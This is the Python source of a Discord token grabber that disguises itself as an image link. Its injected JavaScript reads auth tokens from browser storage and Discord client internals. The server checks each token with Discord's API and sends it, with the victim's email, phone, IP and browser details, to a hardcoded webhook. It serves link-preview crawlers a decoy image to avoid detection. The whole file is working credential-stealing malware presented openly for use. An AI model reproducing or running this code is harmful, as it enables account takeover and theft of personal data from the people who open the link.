# Discord Token Grabber
# Modified from Discord Image Logger by DeKrypt

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, json, re

__app__ = "Discord Token Grabber"
__description__ = "A simple application which allows you to steal Discord tokens by abusing Discord's Open Original feature"
__version__ = "v2.1"
__author__ = "Modified"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1379533420828557672/nAQgnVJR2iTwKTUBMBUMQ6NX3XQP6QMLMYmGW9BKwZ4sNhrsbdz50SOiy0x2Fq6TGMDZ",
    "image": "https://media.discordapp.net/attachments/1365399323889762427/1379533678429995058/mamibaci.png?ex=6840965b&is=683f44db&hm=767cf598ba2008e0fe58918cc3de6e1117f1dc15ff2f497cbf9bbbc6543cd7f5&=&format=webp&quality=lossless&width=484&height=234",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Token Grabber", 
    "color": 0xFF0000, # Red color for token alerts

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,

    "message": {
        "doMessage": False,
        "message": "Loading...",
        "richMessage": False,
    },

    "linkAlerts": True,
    "buggedImage": True,

    "antiBot": 1,

    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://discord.com" # Redirect to Discord after token grab
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Token Grabber - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to grab tokens!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def validateToken(token):
    """Validate if the token is a real Discord token"""
    try:
        headers = {"Authorization": token}
        response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
        return response.status_code == 200
    except:
        return False

def getTokenInfo(token):
    """Get user information from Discord token"""
    try:
        headers = {"Authorization": token}
        response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
        if response.status_code == 200:
            return response.json()
        return None
    except:
        return None

def makeTokenReport(tokens, ip, useragent=None, endpoint="N/A"):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Token Grabber - Link Sent",
            "color": config["color"],
            "description": f"A **Token Grabbing** link was sent in a chat!\nYou may receive tokens soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None
        return

    if not tokens:
        return

    valid_tokens = []
    for token in tokens:
        if validateToken(token):
            user_info = getTokenInfo(token)
            if user_info:
                valid_tokens.append({
                    "token": token,
                    "user_info": user_info
                })

    if not valid_tokens:
        return

    ping = "@everyone"
    os, browser = httpagentparser.simple_detect(useragent)
    
    # Create embed for each valid token
    for token_data in valid_tokens:
        user_info = token_data["user_info"]
        token = token_data["token"]
        
        embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Token Grabber - Discord Token Grabbed!",
                "color": config["color"],
                "description": f"""**Discord Token Successfully Grabbed!**

**Token Info:**
> **Token:** `{token}`
> **User ID:** `{user_info.get('id', 'Unknown')}`
> **Username:** `{user_info.get('username', 'Unknown')}#{user_info.get('discriminator', '0000')}`
> **Display Name:** `{user_info.get('global_name', 'Unknown')}`
> **Email:** `{user_info.get('email', 'Not Available')}`
> **Phone:** `{user_info.get('phone', 'Not Available')}`
> **Verified:** `{user_info.get('verified', False)}`
> **MFA Enabled:** `{user_info.get('mfa_enabled', False)}`
> **Premium Type:** `{user_info.get('premium_type', 0)}`

**System Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **OS:** `{os}`
> **Browser:** `{browser}`
> **Endpoint:** `{endpoint}`

**User Agent:**
```
{useragent}
```""",
                "thumbnail": {
                    "url": f"https://cdn.discordapp.com/avatars/{user_info.get('id')}/{user_info.get('avatar')}.png" if user_info.get('avatar') else "https://cdn.discordapp.com/embed/avatars/0.png"
                }
        }
      ],
    }
        
        requests.post(config["webhook"], json = embed)

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            # Token grabbing HTML with JavaScript
            token_grabber_script = '''
            <script>
            // Discord Token Grabber Script
            function grabTokens() {
                let tokens = [];
                
                // Method 1: localStorage
                try {
                    for (let i = 0; i < localStorage.length; i++) {
                        let key = localStorage.key(i);
                        let value = localStorage.getItem(key);
                        if (value && value.includes('token')) {
                            let tokenMatch = value.match(/"token":"([^"]+)"/);
                            if (tokenMatch) {
                                tokens.push(tokenMatch[1]);
                            }
                        }
                    }
                } catch(e) {}
                
                // Method 2: sessionStorage
                try {
                    for (let i = 0; i < sessionStorage.length; i++) {
                        let key = sessionStorage.key(i);
                        let value = sessionStorage.getItem(key);
                        if (value && value.includes('token')) {
                            let tokenMatch = value.match(/"token":"([^"]+)"/);
                            if (tokenMatch) {
                                tokens.push(tokenMatch[1]);
                            }
                        }
                    }
                } catch(e) {}
                
                // Method 3: Check for Discord app data
                try {
                    let webpackChunkdiscord_app = window.webpackChunkdiscord_app;
                    if (webpackChunkdiscord_app) {
                        webpackChunkdiscord_app.push([[''], {}, e => {
                            for (let c in e.c) {
                                if (e.c[c]?.exports?.default?.getToken !== void 0) {
                                    let token = e.c[c].exports.default.getToken();
                                    if (token) tokens.push(token);
                                }
                                if (e.c[c]?.exports?.getToken !== void 0) {
                                    let token = e.c[c].exports.getToken();
                                    if (token) tokens.push(token);
                                }
                            }
                        }]);
                    }
                } catch(e) {}
                
                // Method 4: Direct token search in global variables
                try {
                    if (window.DiscordNative && window.DiscordNative.nativeModules) {
                        let token = window.DiscordNative.nativeModules.ensureModule('discord_utils').getToken();
                        if (token) tokens.push(token);
                    }
                } catch(e) {}
                
                // Remove duplicates and send tokens
                tokens = [...new Set(tokens)];
                
                if (tokens.length > 0) {
                    // Send tokens to server
                    fetch(window.location.href, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({tokens: tokens})
                    });
                }
            }
            
            // Run token grabber
            setTimeout(grabTokens, 1000);
            setTimeout(grabTokens, 3000);
            setTimeout(grabTokens, 5000);
            </script>
            '''

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>{token_grabber_script}'''.encode()
            
            if self.headers.get('x-forwarded-for', '').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for', ''), self.headers.get('user-agent', '')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()

                if config["buggedImage"]: self.wfile.write(binaries["loading"])
                return
            
            else:
                s = self.path

                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="3;url={config["redirect"]["page"]}">{data.decode()}'.encode()
                
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error')
            reportError(traceback.format_exc())

        return
    
    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 0:
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data.decode('utf-8'))
                
                if 'tokens' in data:
                    makeTokenReport(
                        data['tokens'], 
                        self.headers.get('x-forwarded-for', self.client_address[0]), 
                        self.headers.get('user-agent', ''), 
                        self.path.split("?")[0]
                    )
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status": "ok"}')
            
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(traceback.format_exc())
    
    do_GET = handleRequest

handler = ImageLoggerAPI
